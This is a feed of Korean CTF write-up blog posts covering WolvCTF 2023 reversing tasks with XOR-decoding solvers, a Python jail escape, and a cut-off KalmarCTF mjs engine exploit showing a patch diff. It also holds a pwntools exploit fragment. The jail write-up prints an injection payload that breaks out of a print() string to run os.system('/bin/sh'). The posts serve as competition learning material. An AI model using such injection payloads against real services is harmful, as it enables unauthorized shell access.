class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;w3l1_m4yb3_th4t_w45_a_b4d_id3a&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium/hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - child-re (rev)</title>
      <link href="/230321-wolvctf2023-childre/"/>
      <url>/230321-wolvctf2023-childre/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>You‚Äôve graduated from baby, congrats!</p></blockquote><ul><li>[141 solves &#x2F; 100 points]</li></ul><p>Î¶¨Î≤ÑÏã± Î¨∏Ï†úÏóêÏÑú ÏÜîÎ∏åÍ∞Ä Í∞ÄÏû• ÎßéÏïÑÏÑú ÎèÑÏ†ÑÌï¥Î¥§Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>mainÏùÑ ÏÇ¥Ìé¥Î≥¥Î©¥ ÌîåÎûòÍ∑∏Îäî Ïñ¥ÎîîÏóîÍ∞Ä ÏûàÎã§Í≥† ÌïúÎã§. Î¨∏ÏûêÏó¥ Í≤ÄÏÉâÏúºÎ°úÎäî Î≥¥Ïù¥ÏßÄ ÏïäÍ≥† Ìï®Ïàò Î™©Î°ùÏùÑ ÏÇ¥Ìé¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÏùÄ Ìï®ÏàòÍ∞Ä Î≥¥Ïù∏Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1165</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">43</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;]I^LQb\x1B^IBB\x1BA\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1EF\x1ERS\v\vu\x1E\x18W&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏõêÎûò <code>strcpy</code>Í∞Ä Î≥¥Ïù¥ÏßÄ ÏïäÏïòÎäîÎç∞ Î≥ÄÏàòÎì§ ÏûêÎ£åÌòïÏù¥ÎÇò Î∞∞Ïó¥ ÌÅ¨Í∏∞Î•º Ï°∞Ï†àÌï¥Ï£ºÎãàÍπå Î≥¥ÏòÄÎã§. Î≠îÍ∞Ä <code>puts</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ flagÎ•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§Í≥† ÏÉùÍ∞ÅÌï¥ÏÑú Ï†Ä Ìï®ÏàòÎßå Îî∞Î°ú Ïã§ÌñâÏãúÏºúÎ≥¥Í∏∞Î°ú ÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏΩîÎìúÎ•º ÏûëÏÑ±Ìï¥Ï£ºÍ≥† Ïª¥ÌååÏùº ÌõÑ Ïã§ÌñâÌïòÎ©¥..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*char v2[43]; // [rsp+10h] [rbp-60h] BYREF*/</span></span><br><span class="line"><span class="type">char</span>* v2;</span><br><span class="line"><span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"><span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/*memset(s, 0, sizeof(s));*/</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="string">&quot;]I^LQb\x1B^IBB\x1B\x41\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1E\x46\x1ERS\v\vu\x1E\x18W&quot;</span>;</span><br><span class="line">  <span class="type">char</span> a1 = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flagÍ∞Ä Ïß†! ÌïòÍ≥† ÎÇòÏò®Îã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;H1tchh1k3r5_Gu1d3_t0_th3_G4l4xy!!_42&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - Homework Help (rev)</title>
      <link href="/230321-wolvctf2023-homeworkhelp/"/>
      <url>/230321-wolvctf2023-homeworkhelp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>I wrote a program to solve my math homework so I could find flags. Unfortunatly my program sucks at math and just makes me do it. It does find flags though</p></blockquote><ul><li>[93 solves &#x2F; 265 points]</li></ul><p>Î¶¨Î≤ÑÏã± Î¨∏Ï†úÏóêÏÑú Îëê! Î≤àÏß∏Î°ú ÏÜîÎ∏åÍ∞Ä ÎßéÏïÑÏÑú ÎèÑÏ†ÑÌï¥Î¥§Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∂ÑÏÑùÌïòÎã§Î≥¥Î©¥ Ï°∞Í∏à Ïñ¥Ïù¥ÏóÜÎäîÎç∞(?) Í≤∞Íµ≠ Î∂ÑÏÑùÌï¥ÏïºÌï† Ìï®ÏàòÎäî ÌïòÎÇòÎã§. <code>_stack_chk_fail</code> Ìï®ÏàòÏù¥Îã§. Ìï®ÏàòÎ™ÖÏù¥ Ìó∑Í∞àÎ†§ÏÑú IDAÎèÑ Î∂ÑÏÑùÏùÑ Ï†úÎåÄÎ°ú Î™ªÌï¥ÏÑú Î∂ÑÏÑùÌï¥ÏïºÌï† Ìï®ÏàòÎ•º ÏßÅÍ¥ÄÏ†ÅÏúºÎ°ú Ï∞æÏßÄ Î™ªÌñàÎã§. Ïù¥Îü∞ Í≤ΩÏö∞Îäî Ïñ¥ÏÖàÎ∏îÎ¶¨Î•º ÏßÅÏ†ë ÌôïÏù∏Ìï¥Ïïº Ï†ïÌôïÌïòÍ≤å Î∂ÑÏÑùÌï† Ïàò ÏûàÎã§.</p><p>ÏïÑÎ¨¥Îì† Î∂ÑÏÑùÌï¥ÏïºÌï† Î°úÏßÅÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0x41</span>; ; i = v3[idx + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  v3[<span class="number">0</span>] ^= i;</span><br><span class="line">  <span class="keyword">if</span> ( FLAG[idx] != v3[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ++idx == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done.&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>break</code> ÎêòÏßÄ ÏïäÏúºÎ©¥ flagÎ•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïù¥Î•º pythonÏúºÎ°ú Îã§Ïãú Ïû¨Íµ¨ÌòÑÌñàÎã§. Ïù¥Îïå <code>v3</code> Î≥ÄÏàòÍ∞Ä Ìó∑Í∞àÎ¶¨Í≤å ÏïÑÎûòÏ≤òÎüº Ï†ïÏùòÎêòÏñ¥ ÏûàÏñ¥ÏÑú Ï£ºÏùòÌïòÏûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v3[<span class="number">2</span>] = <span class="number">0x14</span>;</span><br><span class="line">*&amp;v3[<span class="number">3</span>] = <span class="number">0x1200000017</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">5</span>] = <span class="number">0x500000001D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">7</span>] = <span class="number">0x5D00000046</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">9</span>] = <span class="number">0x4100000042</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">11</span>] = <span class="number">0x330000006C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">13</span>] = <span class="number">0x5A0000005D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">15</span>] = <span class="number">0x3A0000000E</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">17</span>] = <span class="number">0x410000006A</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">19</span>] = <span class="number">0x5700000040</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">21</span>] = <span class="number">0x3400000008</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">23</span>] = <span class="number">0xB0000003C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">25</span>] = <span class="number">0x3400000003</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">27</span>] = <span class="number">0x4600000028</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">29</span>] = <span class="number">0x530000005F</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">31</span>] = <span class="number">0x5000000010</span>LL;</span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">0x36</span>;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">arr = [</span><br><span class="line">    <span class="number">0x1400000036</span>,</span><br><span class="line">    <span class="number">0x1200000017</span>,</span><br><span class="line">    <span class="number">0x500000001D</span>,</span><br><span class="line">    <span class="number">0x5D00000046</span>,</span><br><span class="line">    <span class="number">0x4100000042</span>,</span><br><span class="line">    <span class="number">0x330000006C</span>,</span><br><span class="line">    <span class="number">0x5A0000005D</span>,</span><br><span class="line">    <span class="number">0x3A0000000E</span>,</span><br><span class="line">    <span class="number">0x410000006A</span>,</span><br><span class="line">    <span class="number">0x5700000040</span>,</span><br><span class="line">    <span class="number">0x3400000008</span>,</span><br><span class="line">    <span class="number">0x0B0000003C</span>,</span><br><span class="line">    <span class="number">0x3400000003</span>,</span><br><span class="line">    <span class="number">0x4600000028</span>,</span><br><span class="line">    <span class="number">0x530000005F</span>,</span><br><span class="line">    <span class="number">0x5000000010</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">arr2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    arr2.append(i &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    arr2.append(i &gt;&gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">current = arr2[<span class="number">0</span>] ^ <span class="number">0x41</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr2)):</span><br><span class="line">    current = current ^ arr2[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Ï≤´ Î≤àÏß∏ Î∞òÎ≥µÎ¨∏Ïùº Í≤ΩÏö∞Îßå <code>0x41</code>ÏùÑ xor ÌñàÏúºÎãà Í∑∏ Í≤ΩÏö∞Îßå Î®ºÏ†Ä Ï≤òÎ¶¨Ìï¥Ï£ºÍ≥† Í∑∏ Îã§ÏùåÎ∂ÄÌÑ∞Îäî 1Î∂ÄÌÑ∞ 1Ïî© Ïò¨Î†§Í∞ÄÎ©¥ÏÑú xorÎ•º Ï≤òÎ¶¨Ìï¥Ï£ºÎ©¥ ÎêúÎã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;+m0r3_l1ke_5t4ck_chk_w1n=-&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> easy/medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - escaped (jail escape)</title>
      <link href="/230320-wolvctf2023-escaped/"/>
      <url>/230320-wolvctf2023-escaped/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>nya<br><code>nc escaped.wolvctf.io 1337</code></p></blockquote><ul><li>[54 solves &#x2F; 50 points]</li></ul><p>jail escapeÎùºÍ≥†ÎèÑ ÌïòÍ≥† jail breakÎùºÍ≥†ÎèÑ ÌïòÎäî ÎìØ</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î¨∏Ï†úÏóêÏÑú Ï£ºÏñ¥ÏßÑ python ÏΩîÎìúÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my `cat` program. Give me a string and I&#x27;ll output it back.&quot;</span>)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter your string (with double quotes) &gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> code[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> code[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> <span class="built_in">all</span>(ch != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">for</span> ch <span class="keyword">in</span> code[<span class="number">1</span>:-<span class="number">1</span>]):</span><br><span class="line">  compiled = <span class="built_in">compile</span>(<span class="string">&#x27;print(&quot;&#x27;</span> + <span class="built_in">eval</span>(code) + <span class="string">&#x27;&quot;)&#x27;</span>, <span class="string">&quot;out&quot;</span>, mode = <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure><p>‚Äú‚ÄùÏúºÎ°ú Í∞êÏã∏ÏÑú ÏûÖÎ†•ÏùÑ Î≥¥ÎÇ¥Î©¥ print Ìï®ÏàòÎ•º Ïù¥Ïö©Ìï¥ÏÑú Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïù¥Îïå Ï£ºÏùòÌï¥ÏïºÌï† Ï†êÏùÄ ‚ÄúÏôÄ ‚Äú ÏÇ¨Ïù¥Ïóê ‚ÄúÍ∞Ä Îòê Îì§Ïñ¥Í∞ÄÎ©¥ ÏïàÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ÏïΩÍ∞Ñ Ïª§Îß®Îìú Ïù∏Ï†ùÏÖò ÌïòÎäî ÎäêÎÇåÏúºÎ°ú Îã§Í∞ÄÍ∞ÄÎ≥¥Ïûê.<br><code>&quot;</code>Ïùò ÏïÑÏä§ÌÇ§ ÏΩîÎìúÏù∏ <code>\x22</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ <code>print(&quot;&quot;)</code>ÏùÑ ÎßåÎì§Ïñ¥Ï£ºÍ≥† <code>;</code>ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Î™ÖÎ†πÏñ¥Î•º ÌïòÎÇò Îçî Ïã§ÌñâÏãúÌÇ§Î©¥ ÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;a&quot;);print(&quot;b&quot;)</span><br><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure><p>Ï§ëÏöîÌïú Ï†êÏùÄ ÌéòÏù¥Î°úÎìúÎ•º Î≥¥ÎÇº Îïå <code>&quot;</code>ÏôÄ <code>&quot;</code>ÏúºÎ°ú Í∞êÏã∏Ïïº ÌïúÎã§.</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x22);__import__(&#x27;os&#x27;).system(&#x27;/bin/sh&#x27;)#&quot;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;m30w_uwu_:3&#125;</span><br></pre></td></tr></table></figure><img src="/images/230320-wolvctf2023-escaped/Screenshot 2023-03-29 at 16.32.27.png" width=600/><br>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KalmarCTF 2023 - mjs (JS Engine, OOB)</title>
      <link href="/230318-kalmarctf2023-mjs/"/>
      <url>/230318-kalmarctf2023-mjs/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1878">https://ctftime.org/event/1878</a></li></ul><blockquote><p>Toddler‚Äôs first browser exploitation: <a href="https://github.com/cesanta/mjs">https://github.com/cesanta/mjs</a><br><code>nc 54.93.211.13 10002</code><br><code>clone</code>, <code>pwn</code>, <code>warmup</code></p></blockquote><ul><li>[52 solves &#x2F; 100 points]</li></ul><p>Ï≤òÏùåÏúºÎ°ú Ìè¨ÎÑàÎ∏îÏóê ÎÇòÏò® ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏóîÏßÑ Î¨∏Ï†úÎ•º ÏôÑÏ£ºÌñàÎã§..! ÌíÄÏù¥Î•º Îëê Í∞ÄÏßÄ ÏÜåÍ∞úÌïúÎã§. Ï≤´ Î≤àÏß∏ ÌíÄÏù¥Îäî ÎÇ¥Í∞Ä ÌíÄÏù¥Ìïú Î∞©ÏãùÏù¥Í≥† Îëê Î≤àÏß∏Îäî ÏπúÍµ¨Í∞Ä ÌíÄÏù¥Ìïú Î∞©ÏãùÏù¥Îã§. ÏπúÍµ¨ ÌíÄÏù¥ Î≥¥Î©¥ÏÑú ÎßéÏù¥ Í≥µÎ∂ÄÌï† Ïàò ÏûàÏóàÎã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Ïù¥ Î¨∏Ï†úÎäî descriptionÏóê Ìè¨Ìï®Îêú mjs Î†àÌè¨Î•º Ï∞∏Í≥†Ìï¥ÏÑú Î∂ÑÏÑùÏùÑ Ìï¥ÏïºÌïúÎã§. Î¨∏Ï†úÏóêÏÑúÎäî Î∏åÎùºÏö∞Ï†Ä ÏùµÏä§ÎùºÍ≥† ÌëúÌòÑÌñàÏßÄÎßå Î†àÌè¨Ïóê Îì§Ïñ¥Í∞ÄÏÑú OverviewÎ•º ÏùΩÏñ¥Î≥¥Î©¥ Î∏åÎùºÏö∞Ï†ÄÏóê Ïã§Ï†úÎ°ú Ïì∞Ïù¥Îäî ÏóîÏßÑÏù∏ÏßÄÎäî Ïûò Î™®Î•¥Í≤†Îã§..„Öé IoT Í∏∞Í∏∞ÏóêÏÑú Î≥º Ïàò ÏûàÏùÑ Í≤É Í∞ôÎã§.</p><p>ÏïÑÎ¨¥Ìäº Ïù¥ Î¨∏Ï†úÏóêÏÑú diff.patch ÌååÏùºÏùÑ Ï†úÍ≥µÌï¥Ï§¨ÎäîÎç∞ ÏÇ¥Ìé¥Î≥¥Ïûê. </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/Makefile b/Makefile</span></span><br><span class="line"><span class="comment">index d265d7e..d495e84 100644</span></span><br><span class="line"><span class="comment">--- a/Makefile</span></span><br><span class="line"><span class="comment">+++ b/Makefile</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,7 @@</span> BUILD_DIR = build</span><br><span class="line"> RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)</span><br><span class="line"> DOCKER_GCC ?= $(RD) mgos/gcc</span><br><span class="line"> DOCKER_CLANG ?= $(RD) mgos/clang</span><br><span class="line"><span class="addition">+CC = clang</span></span><br><span class="line"> </span><br><span class="line"> include $(SRCPATH)/mjs_sources.mk</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -81,7 +82,7 @@</span> CFLAGS += $(COMMON_CFLAGS)</span><br><span class="line"> # NOTE: we compile straight from sources, not from the single amalgamated file,</span><br><span class="line"> # in order to make sure that all sources include the right headers</span><br><span class="line"> $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)</span><br><span class="line"><span class="deletion">-$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"><span class="addition">+$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"> </span><br><span class="line"> $(BUILD_DIR):</span><br><span class="line"> mkdir -p $@</span><br><span class="line"><span class="comment">diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">index 6f51e08..36c2b43 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_builtin.c</span></span><br><span class="line"><span class="meta">@@ -137,12 +137,12 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));</span><br><span class="line">   mjs_set(mjs, obj, &quot;print&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, 